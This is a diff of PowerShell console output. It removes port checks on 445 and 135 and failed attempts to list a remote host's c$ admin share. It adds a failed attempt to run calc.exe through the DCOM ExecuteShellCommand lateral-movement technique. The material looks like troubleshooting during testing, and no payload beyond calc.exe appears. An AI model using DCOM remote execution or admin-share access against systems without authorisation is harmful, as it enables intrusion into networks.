@@ -1,33 +1,8 @@
-PS C:\*****> Test-NetConnection ip -Port 445
-
-ComputerName     : ip
-RemoteAddress    : ip
-RemotePort       : 445
-InterfaceAlias   : Ethernet0
-SourceAddress    : ip
-TcpTestSucceeded : True
-
-PS C:\Users\***> Test-NetConnection ip -Port 135
-
-ComputerName     : ip
-RemoteAddress    : ip
-RemotePort       : 135
-InterfaceAlias   : Ethernet0
-SourceAddress    : ip
-TcpTestSucceeded : True
-
-PS C:\Users\****> ls \\ip\c$
-ls : Cannot find path '\\ip\c$' because it does not exist.
+PS C:\Users\****> $com.Document.ActivateView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,"7")
+You cannot call a method on a null-valued expression.
 At line:1 char:1
 
-ls \\ip\c$
-  + CategoryInfo          : ObjectNotFound: (\\ip\c$:String) [Get-ChildItem], ItemNotFoundException
-  + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
-PS C:\Users\***> dir \\ip\c$
-dir : Cannot find path '\\ip\c$' because it does not exist.
-At line:1 char:1
-
-dir \\ip\c$
-~~~~
-CategoryInfo : ObjectNotFound: (\\ip\c$:String) [Get-ChildItem], ItemNotFoundException
-FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+$com.Document.ActivateView.ExecuteShellCommand("C:\Windows\System32\c ...
+~~~~~~~~~~~~~~~~~
+CategoryInfo : InvalidOperation: (:) [], RuntimeException
+FullyQualifiedErrorId : InvokeMethodOnNull
